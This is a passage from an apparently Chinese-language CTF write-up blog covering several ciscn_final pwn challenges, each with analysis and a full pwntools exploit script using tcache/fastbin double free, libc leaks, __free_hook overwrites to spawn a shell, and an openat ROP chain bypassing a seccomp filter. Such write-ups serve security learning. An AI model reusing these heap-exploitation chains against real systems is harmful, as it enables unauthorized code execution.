class="title">leak_stderr</span><span class="params">()</span>:</span></span><br><span class="line">    offset = (_IO_list_all_offset + <span class="number">0x22000</span> - <span class="number">8</span>) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'\x30\x00'</span> <span class="comment"># $pc start</span></span><br><span class="line">    p.sendafter(<span class="string">"Input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = read(<span class="number">1</span>, <span class="number">7</span>) <span class="comment"># $r1 = code[$pc + 7] = code[0x3008]</span></span><br><span class="line">    payload += read(<span class="number">2</span>, <span class="number">7</span>) <span class="comment"># $r2 = code[$pc + 7] = code[0x3009]</span></span><br><span class="line">    payload += read_code(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># $r0 = code[($r1 &lt;&lt; 8) + $r2]</span></span><br><span class="line">    payload += print_reg0() <span class="comment"># print $r0</span></span><br><span class="line">    payload += addi(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>) <span class="comment"># $r2 = $r2 + 1</span></span><br><span class="line">    payload += read_code(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># $r0 = code[($r1 &lt;&lt; 8) + $r2]</span></span><br><span class="line">    payload += print_reg0() <span class="comment"># print $r0</span></span><br><span class="line">    payload += halt() <span class="comment"># halt</span></span><br><span class="line">    payload += big_endian(offset &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    payload += big_endian(offset &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_free_hook</span><span class="params">()</span>:</span></span><br><span class="line">    offset = (__free_hook_offset + <span class="number">0x22000</span> - <span class="number">8</span>) / <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'\x30\x00'</span> <span class="comment"># $pc start</span></span><br><span class="line">    p.sendafter(<span class="string">"Input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = read(<span class="number">1</span>, <span class="number">7</span>) <span class="comment"># $r1 = code[$pc + 7] = code[0x3008]</span></span><br><span class="line">    payload += read(<span class="number">2</span>, <span class="number">7</span>) <span class="comment"># $r2 = code[$pc + 7] = code[0x3009]</span></span><br><span class="line">    payload += read(<span class="number">3</span>, <span class="number">7</span>) <span class="comment"># $r3 = code[$pc + 7] = code[0x300A]</span></span><br><span class="line">    payload += write_code(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># code[($r1 &lt;&lt; 8) + $r2] = $r3</span></span><br><span class="line">    payload += addi(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>) <span class="comment"># $r2 = $r2 + 1</span></span><br><span class="line">    payload += read(<span class="number">3</span>, <span class="number">5</span>) <span class="comment"># $r3 = code[$pc + 7] = code[0x300B]</span></span><br><span class="line">    payload += write_code(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># code[($r1 &lt;&lt; 8) + $r2] = $r3</span></span><br><span class="line">    payload += halt() <span class="comment"># halt</span></span><br><span class="line">    payload += big_endian(offset &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    payload += big_endian(offset &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    payload += big_endian(libc_system &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    payload += big_endian(libc_system &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    val = <span class="number">0xF026</span></span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'\x00\x00'</span> </span><br><span class="line">    p.sendafter(<span class="string">"Input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = big_endian(u16(<span class="string">"/b"</span>))</span><br><span class="line">    payload += big_endian(u16(<span class="string">"in"</span>))</span><br><span class="line">    payload += big_endian(u16(<span class="string">"/s"</span>))</span><br><span class="line">    payload += big_endian(u16(<span class="string">"h\x00"</span>))</span><br><span class="line">    payload = payload.ljust(<span class="number">0x6000</span>, <span class="string">'A'</span>)</span><br><span class="line">    payload += quit()</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">_IO_list_all_offset = libc.sym[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">stderr_offset = libc.sym[<span class="string">"_IO_2_1_stderr_"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">libc_stderr = leak_stderr()</span><br><span class="line">libc_base = libc_stderr - stderr_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">write_free_hook()</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">getshell()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="ciscn-final-2"><a href="#ciscn-final-2" class="headerlink" title="ciscn_final_2"></a>ciscn_final_2</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>本地调试的时候因为创建的<code>flag</code>文件是空的，啥也没打印出来，结果以为没成功，愣是浪费时间，有点蠢。</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ol><li><code>execve</code>被禁了，但是<code>flag</code>打开了而且文件描述符改为666。</li><li>很明显的tcache double free，开始以为后面要rop，因为exit里面接受了99个字符的输入，感觉可以写rop chain然后跳过来；后来发现每次写要么只能写2 bytes，要么4 bytes，而地址至少6 bytes，显然行不通。</li><li>改变思路，把<code>stdin-&gt;_fileno</code>改为666，让它在<code>scanf</code>的时候自己读flag自己打印出来就行了。</li><li>由于直接读写都只能是2或者4 bytes，所以还要考虑一下堆布局，分配<code>stdin</code>的chunk空间还是要通过partial write unsorted bin-&gt;bk，至于unsorted bin需要伪造size得到，细节就不赘述了。</li><li>改完<code>stdin-&gt;_fileno</code>退出就能打印出flag了。（有个不明白的地方，开始还担心改完了<code>stdin-&gt;_fileno</code>之后，标准输入流就失效了，那怎么选择退出功能？结果<code>read</code>还是照样可以输入，但是<code>scanf</code>却是直接从<code>flag</code>里面读的，什么原因？）</li><li>还有一个点是，由于double free利用一般是<code>free</code>两次然后<code>malloc</code>三次，所以这里如果一开始tcache bin是空的也就是<code>count==0</code>，那么利用完了之后<code>count==0xFFFF</code>从而被误认为已经满了，所以后续如果<code>free</code>这个size的chunk，是不会放到tcache bin里面的，所以要先<code>free</code>几个块填个位置，防止<code>count==0xFFFF</code>。</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(type, inode)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>, str(type))</span><br><span class="line">    p.sendlineafter(<span class="string">"your inode number:"</span>, str(inode))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(type)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>, str(type))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(type)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>, str(type))</span><br><span class="line">    p.recvuntil(<span class="string">"your int type inode number :"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">stdin_offset = libc.sym[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_addr_low = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> heap_addr_low &lt; <span class="number">0</span>:</span><br><span class="line">    heap_addr_low += <span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enough space</span></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x501</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">39</span>):</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x21</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">new(<span class="number">1</span>, heap_addr_low + <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena_low = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> main_arena_low &lt; <span class="number">0</span>:</span><br><span class="line">    main_arena_low += <span class="number">0x100000000</span></span><br><span class="line">libc_base_low = main_arena_low - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">libc_stdin_low = libc_base_low + stdin_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># avoid fastbin</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">2</span>, heap_addr_low + <span class="number">0x150</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># partial write</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, (libc_stdin_low + <span class="number">112</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">666</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_addr_low: "</span> + hex(heap_addr_low))</span><br><span class="line">success(<span class="string">"libc_base_low: "</span> + hex(libc_base_low))</span><br><span class="line">success(<span class="string">"libc_stdin_low: "</span> + hex(libc_stdin_low))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-3"><a href="#ciscn-final-3" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>题目逻辑简单，但是我还是要花一定时间做堆的布局，还是没有特别熟练，还得练。</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><ol><li>明显的<code>free</code>之后指针没有清空，造成可以double free。</li><li>因为没有传统的那种<code>show</code>功能，因为要爆破写<code>stdout</code>，后面发现每次<code>new</code>一个chunk都会输出chunk的地址，那就好办了。</li><li>这里因为size限制最大为0x78，没办法直接得到unsorted bin，所以还要通过chunk overlap来改size，创造出unsorted bin来。</li><li>后面主要就是让tcache bin和unsorted bin重叠，然后就能通过tcache bin分配到<code>main_arena+0x60</code>的chunk，从而通过打印的chunk地址，leak libc。</li><li>最后继续利用double free改<code>__free_hook</code>为<code>system</code>来getshell。</li></ol><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the index"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"input the size"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"now you can write something"</span>, content)</span><br><span class="line">    p.recvuntil(<span class="string">"gift :0x"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the index"</span>, str(index))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite size</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">'BBBB'</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x18</span>, <span class="string">'\x80'</span>)</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x18</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># enough space</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x48</span>, <span class="string">"CCCC"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    new(i + <span class="number">6</span>, <span class="number">0x78</span>, <span class="string">'CCCC'</span>)</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># avoid fastbin</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">new(<span class="number">15</span>, <span class="number">0x28</span>, <span class="string">"CCCC"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">new(<span class="number">16</span>, <span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">new(<span class="number">17</span>, <span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"><span class="comment"># don't break the unsorted bin</span></span><br><span class="line">new(<span class="number">18</span>, <span class="number">0x78</span>, <span class="string">'\xa0'</span>) </span><br><span class="line">new(<span class="number">19</span>, <span class="number">0x78</span>, <span class="string">"\x00"</span>)</span><br><span class="line">main_arena = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">new(<span class="number">20</span>, <span class="number">0x78</span>, p64(__free_hook))</span><br><span class="line">new(<span class="number">21</span>, <span class="number">0x78</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">new(<span class="number">22</span>, <span class="number">0x78</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-4"><a href="#ciscn-final-4" class="headerlink" title="ciscn_final_4"></a>ciscn_final_4</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>关键就在于这个<code>open</code>被禁用，可以用<code>openat</code>代替。</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><ol><li><code>seccomp-tools dump ciscn_final_4</code>，禁用了<code>execve</code>，显然要orw了。</li><li>binary中的<code>watch</code>函数同时也检测了几个系统调用，也就是不能用： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">watch</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+34h] [rbp-ECh]</span></span><br><span class="line">    __int64 v2; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">    <span class="keyword">char</span> v3; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">    __int64 v4; <span class="comment">// [rsp+B8h] [rbp-68h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_SYSCALL, a1, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        waitpid(a1, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !(stat_loc &amp; <span class="number">0x7F</span>) || (<span class="keyword">char</span>)((stat_loc &amp; <span class="number">0x7F</span>) + <span class="number">1</span>) &gt;&gt; <span class="number">1</span> &gt; <span class="number">0</span> || (stat_loc &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span> != <span class="number">5</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        ptrace(PTRACE_GETREGS, a1, <span class="number">0L</span>L, &amp;v3);</span><br><span class="line">        v2 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( v4 == <span class="number">2</span> || v2 == <span class="number">9</span> || v2 == <span class="number">57</span> || v2 == <span class="number">58</span> || v2 == <span class="number">101</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"hey! what are you doing?"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 禁用了<code>open</code>(2)，<code>mmap</code>(9)，<code>fork</code>(57)，<code>vfork</code>(58)，<code>ptrace</code>(101)系统调用。</li><li>patch掉<code>ptrace(TRACEME, xxx, xxx)</code>，方便调试<code>fork</code>出来的子进程。</li><li>明显的fastbin double free，利用unsorted bin来leak出libc地址，之后利用fastbin attack分配到<code>__malloc_hook</code></li><li>在<code>__malloc_hook</code>布置如下的gadget，目的是将栈下压0x38字节，此时<code>rsp</code>正好只想binary开始我们输入<code>name</code>的位置，因此是可控的，可以提前布置rop chain。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401186 loc_401186:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000401186                 add     rsp, 8</span><br><span class="line">.text:000000000040118A                 pop     rbx</span><br><span class="line">.text:000000000040118B                 pop     rbp</span><br><span class="line">.text:000000000040118C                 pop     r12</span><br><span class="line">.text:000000000040118E                 pop     r13</span><br><span class="line">.text:0000000000401190                 pop     r14</span><br><span class="line">.text:0000000000401192                 pop     r15</span><br><span class="line">.text:0000000000401194                 retn</span><br></pre></td></tr></table></figure></li><li>在binary最开始输入<code>name</code>时布置gadget，完成向bss中写入第二段rop chain，同时将栈迁移到该bss上。</li><li>由于<code>open</code>的禁用，故不可用来打开<code>flag</code>文件。因此这里可以使用<code>openat</code>函数，因为<code>open</code>的内部实际上也是通过<code>openat</code>函数实现打开文件的功能的，因此单独调用<code>openat</code>可以绕过<code>open</code>的限制，也能打开文件。</li><li>接下来就是orw拿flag了。</li></ol><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size?"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content?"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; 